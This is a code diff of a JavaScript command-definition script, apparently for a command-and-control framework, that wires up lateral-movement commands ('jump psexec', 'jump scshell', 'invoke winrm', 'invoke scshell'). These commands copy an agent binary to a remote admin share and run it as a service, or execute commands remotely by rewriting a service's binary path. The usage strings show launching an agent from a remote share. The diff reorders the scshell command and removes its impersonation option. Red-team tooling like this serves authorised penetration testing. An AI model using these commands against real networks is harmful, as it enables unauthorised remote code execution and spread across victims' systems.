@@ -31,6 +31,8 @@ _cmd_jump_psexec.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines)
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
 
+
+
 var _cmd_jump_scshell = ax.create_command("scshell", "Attempt to spawn a session on a remote target via SCShell", "jump scshell 192.168.0.1 /tmp/agent_svc.exe -b update.exe -s C$ -p C:\\Windows -n defragsvc");
 _cmd_jump_scshell.addArgFlagString( "-b", "binary_name",     "Remote binary name", "random");
 _cmd_jump_scshell.addArgFlagString( "-s", "share",           "Share for copying the file", "ADMIN$");
@@ -48,11 +50,9 @@ _cmd_jump_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
     if (binary_name == "random")  binary_name = ax.random_string(8, "alphabetic") + ".exe";
 
-    // Build the remote UNC path and local path on target
     let remote_unc_path = `\\\\${target}\\${share}\\${binary_name}`;
     let local_path_on_target = `${svc_path}\\${binary_name}`;
 
-    // Pack parameters: target, service_name, remote_unc_path (for upload), binary_content
     let bof_params = ax.bof_pack("cstr,cstr,cstr,bytes", [target, svc_name, remote_unc_path, binary_content]);
     let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
     let message = `Task: Jump to ${target} via SCShell (service: ${svc_name}, binary: ${binary_name})`;
@@ -60,28 +60,12 @@ _cmd_jump_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
 
+
+
 var cmd_jump = ax.create_command("jump", "Attempt to spawn a session on a remote target with the specified method");
 cmd_jump.addSubCommands([_cmd_jump_psexec, _cmd_jump_scshell]);
 
 
-var _cmd_invoke_scshell = ax.create_command("scshell", "Use SCShell to execute commands on other systems by modifying service binary path (fileless)", "invoke scshell 10.0.2.10 defragsvc \"cmd.exe /c \\\\10.0.2.1\\share\\agent.exe\"");
-_cmd_invoke_scshell.addArgBool("-i", "Use impersonation for authentication");
-_cmd_invoke_scshell.addArgString("target", true);
-_cmd_invoke_scshell.addArgString("service", true);
-_cmd_invoke_scshell.addArgString("payload", true);
-_cmd_invoke_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
-    let target = parsed_json["target"];
-    let service = parsed_json["service"];
-    let payload = parsed_json["payload"];
-    let impersonate = parsed_json["-i"];
-
-    let bof_params = ax.bof_pack("cstr,cstr,cstr", [target, service, payload]);
-    let bof_name = impersonate ? "scshell_imp" : "scshell";
-    let bof_path = ax.script_dir() + "_bin/" + bof_name + "." + ax.arch(id) + ".o";
-    let message = `Task: Invoke SCShell on ${target} (service: ${service})${impersonate ? " [impersonation]" : ""}`;
-
-    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
-});
 
 var _cmd_invoke_winrm = ax.create_command("winrm", "Use WinRM to execute commands on other systems", "invoke winrm 192.168.0.1 whoami /all");
 _cmd_invoke_winrm.addArgString("target", true);
@@ -96,6 +80,27 @@ _cmd_invoke_winrm.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
+
+
+
+var _cmd_invoke_scshell = ax.create_command("scshell", "Use SCShell to execute commands on other systems by modifying service binary path (fileless)", "invoke scshell 10.0.2.10 defragsvc \"cmd.exe /c \\\\10.0.2.1\\share\\agent.exe\"");
+_cmd_invoke_scshell.addArgString("target", true);
+_cmd_invoke_scshell.addArgString("service", true);
+_cmd_invoke_scshell.addArgString("payload", true);
+_cmd_invoke_scshell.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
+    let target = parsed_json["target"];
+    let service = parsed_json["service"];
+    let payload = parsed_json["payload"];
+
+    let bof_params = ax.bof_pack("cstr,cstr,cstr", [target, service, payload]);
+    let bof_path = ax.script_dir() + "_bin/scshell." + ax.arch(id) + ".o";
+    let message = `Task: Invoke SCShell on ${target} (service: ${service})`;
+
+    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
+});
+
+
+
 var cmd_invoke = ax.create_command("invoke", "Attempt to execute a command on a remote target with the specified method");
 cmd_invoke.addSubCommands([_cmd_invoke_winrm, _cmd_invoke_scshell]);
 
